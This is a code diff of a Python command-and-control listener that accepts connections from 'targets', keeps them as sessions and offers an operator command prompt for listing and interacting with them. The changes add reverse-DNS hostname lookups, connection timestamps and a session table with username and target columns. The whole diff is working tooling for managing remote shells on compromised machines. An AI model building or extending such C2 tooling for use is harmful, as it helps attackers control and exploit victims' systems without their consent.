@@ -1,8 +1,9 @@
 import socket
 import sys
 import threading
-import concurrent.futures
 from prettytable import PrettyTable
+import time
+from datetime import datetime
 
 
 def banner():
@@ -28,9 +29,6 @@ def listener_handler():
     print(
         f'[*] Started listener on {host_ip}:{host_port}...\n')
     sock.listen()
-    # with concurrent.futures.ThreadPoolExecutor() as executor:
-    # f1 = executor.submit(message_handler)
-    # f1.result()
     t1 = threading.Thread(target=message_handler)
     t1.start()
 
@@ -41,9 +39,20 @@ def message_handler():
             break
         try:
             remote_target, remote_ip = sock.accept()
-            sessions.append([remote_target, remote_ip[0]])
-            print(
-                f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
+            current_time = time.strftime("%H:%M:%S", time.localtime())
+            date = datetime.now()
+            time_stamp = (
+                f"{date.month}/{date.day}/{date.year} {current_time}")
+            host_name = socket.gethostbyaddr(remote_ip[0])
+            if host_name is not None:
+                sessions.append(
+                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_stamp])
+                print(
+                    f'\n[*] Connection received from {host_name[0]}@{remote_ip[0]} \nEnter command#> ', end='')
+            else:
+                sessions.append([remote_target, remote_ip[0], time_stamp])
+                print(
+                    f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
         except:
             pass
 
@@ -91,10 +100,12 @@ if __name__ == '__main__':
                 session_counter = 1
                 if command.split(' ')[1] == '-l':
                     table = PrettyTable()
-                    table.field_names = ['Session ID', 'Target']
-                    table.padding_width = 3
+                    table.field_names = ['Session', 'Status', 'Username',
+                                         'Target', 'Connection Time']
+                    table.padding_width = 2
                     for target in sessions:
-                        table.add_row([session_counter, target[1]])
+                        table.add_row(
+                            [session_counter, 'Placeholder', 'Placeholder', target[1], target[2]])
                         session_counter += 1
                     print(table)
                 if command.split(' ')[1] == '-i':
